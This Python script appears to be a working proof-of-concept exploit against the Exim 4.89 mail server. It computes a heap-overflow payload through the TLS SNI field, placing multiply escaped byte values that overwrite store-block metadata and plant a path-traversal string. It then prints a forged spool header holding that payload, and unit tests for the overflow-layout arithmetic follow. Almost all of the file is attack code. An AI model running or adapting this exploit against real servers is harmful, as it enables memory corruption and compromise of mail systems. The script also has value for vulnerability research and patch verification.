#!/usr/bin/env python3
import logging
import math
import unittest
import struct
import sys

class Fix:
    def __init__(self, offset, value, length):
        self.offset = offset # Real offset starting from original buffer
        self.ioffset = None # Offset of fix starting from self.iteration
        self.poffset = None # Offset of fix in original buffer
        self.value = value
        self.length = length
        self.iteration = None # Iteration at witch this fix will be valid (i.e. not escaped)

    def discarded_size_at_iteration(self, i):
        if i >= self.iteration:
            # Nothing should be escaped anymore, so no bytes are discarded
            return 0
        elif i == self.iteration - 1:
            # On second to last iteration hexadecimal is unescaped
            # so '\x23' is converted to a single byte giving a 4 to 1 reduction
            return self.length * 3
        else:
            # On all preceding iteration only '\\' are escaped
            # for example '\\\\x23' is converted to '\\x23'
            # so only 1 byte is unescaped per remaining iteration
            return ((2 ** (self.iteration - i - 1)) - 2 ** (self.iteration - i - 2)) * self.length

    def has_nul_byte(self):
        has_nul_byte = False
        value = self.value
        for _ in range(self.length):
            byte = value % 256
            value //= 256
            if byte == 0:
                has_nul_byte = True

        return has_nul_byte

    def plength(self):
        if self.iteration == 0:
            return self.length
        else:
            return self.length * 3 + self.length * (2 ** (self.iteration - 1))

    def apply(self, payload):
        str_value = ""
        value = self.value
        for _ in range(self.length):
            byte = value % 256
            value //= 256
            if self.iteration > 0:
                escape = "\\" * (2 ** (self.iteration - 1))
                str_value += escape + f"x{byte:02x}"
            else:
                str_value = chr(byte)
        return payload[:self.poffset] + str_value + payload[self.poffset + len(str_value):]

    def __repr__(self):
        return f"Fix(0x{self.offset:x}, 0x{self.value:x}, {self.length})"

class Overflow:
    def __init__(self, buflen, fill):
        assert(buflen % 8 == 0)
        self.fill = fill
        self.buflen = buflen
        self.repeat = None
        self.fixes = []

    def fix(self, offset, value, length):
        self.fixes.append(Fix(offset, value, length))

    def spread(self, repeat):
        fixes = sorted(self.fixes, key=lambda fix: fix.offset)
        remaining_fixes = [fix for fix in fixes]
        applied_fixes = []
        # We keep each fix.iteration since they are the most accurate we currently have

        current_buflen = self.buflen
        p = 0
        for i in range(repeat):
            p += current_buflen

            for fix in remaining_fixes:
                if fix.offset < p:
                    fix.iteration = i
                    fix.ioffset = fix.offset - (p - current_buflen)
                    applied_fixes.append(fix)
                elif fix.iteration == i:
                    # Fix iteration has been wrongly calculated at previous step
                    fix.iteration += 1

            remaining_fixes = [fix for fix in fixes if fix.offset > p]
            logging.debug(f"Total repetition: {repeat}, current iteration: {i}, SNI length {current_buflen:x}")
            logging.debug("Applied fixes:")
            logging.debug(applied_fixes)
            logging.debug("Remainging fixes:")
            logging.debug(remaining_fixes)
            # Unescape each fix
            reduction = sum([fix.discarded_size_at_iteration(i) for fix in remaining_fixes])
            logging.debug(f"Fixes reduction: {reduction}")
            current_buflen -= reduction
            # Unescape overflow
            reduction = 0
            if (repeat - i) > 3:
                # Compute difference between number of escape at this step and at next step
                reduction = 2 ** (repeat - i - 3) - 2 ** (repeat - i - 3 - 1)
            elif (repeat - i) == 3:
                reduction = 1
            logging.debug(f"Reduction: {reduction}")
            current_buflen -= reduction
        return applied_fixes

    def layout(self):
        # Initial guess is that all fixes will be applied on first iteration
        repeat = 0
        for fix in self.fixes:
            fix.iteration = 0

        applied_fixes = []
        while len(applied_fixes) < len(self.fixes):
            applied_fixes = self.spread(repeat)
            repeat += 1

        self.repeat = repeat - 1
        logging.info(f"Overflow repeat: {self.repeat}")

        assert(self.repeat is not None)
        # Ensure choosen repetition is applied
        applied_fixes = self.spread(self.repeat)
        assert(len(applied_fixes) == len(self.fixes))

        last = None
        applied_fixes = []
        for fix in sorted(self.fixes, key=lambda fix: fix.ioffset):
            reduction = sum([sum([applied.discarded_size_at_iteration(i) for i in range(fix.iteration)]) for applied in applied_fixes])
            logging.debug(f"{fix} reduction: {reduction}")
            fix.poffset = fix.ioffset + reduction
            if last is not None and last.poffset + last.plength() > fix.poffset: #MTA
                raise ValueError(f"{last} overlaps on targeted offset of {fix}")
            logging.info(f"{fix} applied from 0x{fix.poffset:x} to 0x{fix.poffset + fix.plength():x} of payload targeting iteration {fix.iteration} with offset 0x{fix.ioffset:x}")
            applied_fixes.append(fix)
            last = fix

        prev = None
        for fix in sorted(self.fixes, key=lambda fix: fix.poffset):
            if prev is not None:
                if prev.has_nul_byte():
                    if fix.iteration > prev.iteration + 1:
                        raise ValueError(f"Can't reach iteration {fix.iteration} for {fix} because {prev} contains nul bytes and is written before")
                    elif fix.iteration == prev.iteration + 1 and fix.poffset > prev.poffset:
                        raise ValueError(f"Can't write {fix} because {prev} contains nul bytes and is written before")
            prev = fix

    def payload(self):
        payload = self.fill * math.ceil(self.buflen / len(self.fill))
        assert(len(payload) >= self.buflen)
        # Put as much \ as repetition requires
        # 2 repetitions means buffer is copied once so no exploit is required
        # 3 repetitions means buffer is copied twice so exploit is required and then 1 '\' is required
        # 4 repetetions means buffer is copied thrice so exploit is required and then '\' must be escaped
        if self.repeat > 3:
            escape = "\\" * (2 ** (self.repeat - 3)) + "\\"
        elif self.repeat == 3:
            escape = "\\"
        else:
            escape = ""

        # avoiding filling last byte because it will be '\0' once sent
        payload = payload[:self.buflen - 1 - len(escape)] + escape

        for fix in self.fixes:
            payload = fix.apply(payload)

        return payload

def sni():

    current_block_length = 0x2000
    sni_offset = 0x68

    remaining_space = current_block_length - sni_offset

    # Original SNI and its copy must fit in the current Store block and SNI must be 8 aligned
    # In order to trigger the vulnerability
    original_sni_length = 8 * (remaining_space // 2 // 8)

    logging.info(f"Original SNI length: {original_sni_length:x}")

    overflow = Overflow(original_sni_length, "a")
    # fix store-block next pointer
    overflow.fix(remaining_space + 0x28 + 0x00, 0x0000000000000000, 8)
    # fix store-block length
    overflow.fix(remaining_space + 0x28 + 0x08, 0x0000000000002000, 8)
    # corrupt id
    overflow.fix(remaining_space + 0x28 + 0x19, 0x2e2e2f2e2e2f2e2e, 8)
    overflow.fix(remaining_space + 0x28 + 0x19 + 0x08, 0x742f2e2e2f2e2e2f, 8)
    overflow.fix(remaining_space + 0x28 + 0x19 + 0x10, 0x0065746f742f706d, 8)

    overflow.layout()
    payload = overflow.payload()

    return payload

def main():
    id = "1i7Jgy-baaaad-Pb"
    sys.stdout.write(id + "-H\n")
    sys.stdout.write("Debian-exim 105 109\n")
    sys.stdout.write("<exim@synacktiv.com>\n")
    sys.stdout.write("1569679277 0\n")
    sys.stdout.write("-received_time_usec .793865\n")
    sys.stdout.write("-helo_name " + "b" * 0x2fd0 + "\n")
    sys.stdout.write("-host_address 192.168.122.1.45170\n")
    sys.stdout.write("-interface_address 192.168.122.244.25\n")
    sys.stdout.write("-received_protocol esmtps\n")
    sys.stdout.write("-body_linecount 3\n")
    sys.stdout.write("-max_received_linelength 25\n")
    sys.stdout.write("-deliver_firsttime\n")
    sys.stdout.write("-host_lookup_failed\n")
    sys.stdout.write("-tls_cipher TLS1.2:ECDHE_RSA_AES_256_GCM_SHA384:256\n")
    sys.stdout.write("-tls_sni " + sni() + "\n")
    sys.stdout.write("-tls_ourcert -----BEGIN CERTIFICATE-----\\nMIIC0jCCAboCCQDswnUq91Uj1zANBgkqhkiG9w0BAQsFADArMQswCQYDVQQGEwJV\\nUzEcMBoGA1UEAwwTc3RyZXRjaC5leGFtcGxlLm9yZzAeFw0xOTA5MTkxMzQ5MTBa\\nFw0yMjA5MTgxMzQ5MTBaMCsxCzAJBgNVBAYTAlVTMRwwGgYDVQQDDBNzdHJldGNo\\nLmV4YW1wbGUub3JnMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxc8m\\nNTICLprToAFsrmj32SduD3QvYMPvyB9SsnQte8ETkZ4+BDcb/ChS3GuGWW5bpjCE\\ntMSQIqVBs6yh0OcvG+LSmb+zh0Eomt9SsdYjh7afsZYtL6s6Uz+Cs9NC6f0mn0wh\\nRcM/Lr2cogfcTTSF91Wiu8JcYzHlh6U/4ltNebO5XhYOMe+Y4jOgJDarIixPe3LG\\n3pn0dXYGQMDoYae0xtRYE2uIwULuS2fPwywuMDkR64Jnbuk4a0MDaQFUL/qub6LL\\njiIyUu6bm4Yucb+dtDjKNnqMBIxfQZPMnzYDWBdA6/eNMnVesafC1oAiO7NnxWLJ\\nKllxgvXEEfP1cmdnxQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQCsQO7zTQi6o8iD\\nS0gUe+mzurJ19/Afio/DFyw9pnsMEwQFj5jsofSLBDLGIY3L1Gmo3Ch/SEjV+N8M\\noBNshAGBNpyOEuedNq7Ly9Ou749iS1HAbJ98eR0MB4VHCrJbrDqo4Df2CdbMI/2j\\n3lxSI/KqMP8d4XFE+0eFvJd6jP2Wl8DA1k8SMQVU9ivZNYO/x/SqDqeSbABQyq+t\\ncQkitKXJRz4u2ur+xSx8WHiRA8y6GneKID6tZRUZ9R4Mn0GoT0O9TERgA9jStbLZ\\ncSuOYpN/UIuKuK9Djy8ciPmEIQ8d+M/r0rgHLeRr03T1/8FA3VstD6Dc+5/O7IRN\\n+BiTRzS0\\n-----END CERTIFICATE-----\\n\n")
    sys.stdout.write("XX\n")
    sys.stdout.write("1\n")
    sys.stdout.write("exim@synacktiv.com\n")
    sys.stdout.write("\n")
    sys.stdout.write("232P Received: from [192.168.122.1] (helo=test)\n")
    sys.stdout.write("	by strech with esmtps (TLS1.2:ECDHE_RSA_AES_256_GCM_SHA384:256)\n")
    sys.stdout.write("	(Exim 4.89)\n")
    sys.stdout.write("	(envelope-from <exim@synacktiv.com>)\n")
    sys.stdout.write("	id " + id + "\n")
    sys.stdout.write("	for exim@synacktiv.com; Sat, 28 Sep 2019 10:01:17 -0400\n")
    sys.stdout.write("026  Subject: I'm playing with your POC\n")
    sys.stdout.write("039I Message-Id: <E" + id + "@synacktiv.com>\n")
    sys.stdout.write("022F From: exim@synacktiv.com\n")
    sys.stdout.write("038  Date: Sat, 28 Sep 2019 10:01:17 -0400\n")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    main()

class TestOverflow(unittest.TestCase):
    def test_single_fix(self):
        overflow = Overflow(0x1000, "a")
        overflow.fix(0x1010, 0x4242, 2)
        overflow.layout()

        self.assertEqual(overflow.repeat, 2)
        self.assertEqual(overflow.fixes[0].iteration, 1)
        self.assertEqual(overflow.fixes[0].ioffset, 0x10)
        self.assertEqual(overflow.fixes[0].poffset, 0x10)

    def test_double_fix(self):
        overflow = Overflow(0x1000, "a")
        overflow.fix(0x1010, 0x4141, 2)
        overflow.fix(0x2030, 0x4242, 2)
        overflow.layout()

        self.assertEqual(overflow.repeat, 3)
        self.assertEqual(overflow.fixes[0].iteration, 1)
        self.assertEqual(overflow.fixes[0].ioffset, 0x10)
        self.assertEqual(overflow.fixes[0].poffset, 0x10)
        self.assertEqual(overflow.fixes[1].iteration, 2)
        self.assertEqual(overflow.fixes[1].ioffset, 0x39)
        self.assertEqual(overflow.fixes[1].poffset, 0x3f)

    def test_triple_fix_on_3_iteration(self):
        overflow = Overflow(0x1000, "a")
        overflow.fix(0x1010, 0x41, 2)
        overflow.fix(0x1030, 0x4242, 2)
        overflow.fix(0x2030, 0x4242, 2)
        overflow.layout()

        self.assertEqual(overflow.repeat, 3)
        self.assertEqual(overflow.fixes[0].iteration, 1)
        self.assertEqual(overflow.fixes[0].ioffset, 0x10)
        self.assertEqual(overflow.fixes[0].poffset, 0x10)
        self.assertEqual(overflow.fixes[1].iteration, 1)
        self.assertEqual(overflow.fixes[1].ioffset, 0x30)
        self.assertEqual(overflow.fixes[1].poffset, 0x36)
        self.assertEqual(overflow.fixes[2].iteration, 2)
        self.assertEqual(overflow.fixes[2].ioffset, 0x3f)
        self.assertEqual(overflow.fixes[2].poffset, 0x4b)

    def test_fix_change_iteration(self):
        overflow = Overflow(0x1000, "a")
        overflow.fix(0x1010, 0x4141, 2)
        overflow.fix(0x1030, 0x4242, 2)
        overflow.fix(0x2ffe, 0x4242, 2)
        overflow.layout()

        self.assertEqual(overflow.repeat, 4)
        self.assertEqual(overflow.fixes[0].iteration, 1)
        self.assertEqual(overflow.fixes[0].ioffset, 0x10)
        self.assertEqual(overflow.fixes[0].poffset, 0x10)
        self.assertEqual(overflow.fixes[1].iteration, 1)
        self.assertEqual(overflow.fixes[1].ioffset, 0x30)
        self.assertEqual(overflow.fixes[1].poffset, 0x3a)
        self.assertEqual(overflow.fixes[2].iteration, 3)
        self.assertEqual(overflow.fixes[2].ioffset, 0x23)
        self.assertEqual(overflow.fixes[2].poffset, 0x29)

    def test_escape_for_exploit_is_correct(self):
        overflow = Overflow(8, "a")

        overflow.repeat = 1
        self.assertEqual(overflow.payload(), "aaaaaaa")
        overflow.repeat = 2
        self.assertEqual(overflow.payload(), "aaaaaaa")
        overflow.repeat = 3
        self.assertEqual(overflow.payload(), "aaaaaa\\")
        overflow.repeat = 4
        self.assertEqual(overflow.payload(), "aaaa\\\\\\")
        overflow.repeat = 5
        self.assertEqual(overflow.payload(), "aa\\\\\\\\\\")



class TestFix(unittest.TestCase):
    def test_fix_discard_at_iteration(self):
        """Test Fix discarded chars at given iteration are computed correctly"""
        fix = Fix(0x1000, 0x4242, 2)
        fix.iteration = 4

        self.assertEqual(fix.discarded_size_at_iteration(0), 8)
        self.assertEqual(fix.discarded_size_at_iteration(1), 4)
        self.assertEqual(fix.discarded_size_at_iteration(2), 2)
        self.assertEqual(fix.discarded_size_at_iteration(3), 6)
        self.assertEqual(fix.discarded_size_at_iteration(4), 0)

    def test_fix_plength(self):
        """ Ensure Fix.plength() is computed correctly.

        "\\\\x23\\\\x24" -> "\\x23\\x24" -> "\x23\x24" -> 0x2324 """
        fix = Fix(0x1000, 0x2324, 2)
        fix.iteration = 3

        self.assertEqual(fix.plength(), 14)

        fix.iteration = 4
        self.assertEqual(fix.plength(), 22)
